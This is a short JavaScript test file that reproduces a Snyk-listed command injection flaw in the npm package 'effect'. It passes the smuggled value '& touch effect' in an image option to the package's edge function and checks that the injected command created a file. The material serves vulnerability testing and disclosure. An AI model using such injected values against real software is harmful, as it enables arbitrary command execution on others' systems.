//https://snyk.io/vuln/SNYK-JS-EFFECT-564256
test("Command Injection in effect", () => 
{
	const Root= require("effect");
	const fs = require('fs');
	const path = './effect';
	const sleep = require('sleep');
	
	var options  = {
		image: "& touch effect"
	}

	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	Root.edge(options, function(){});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});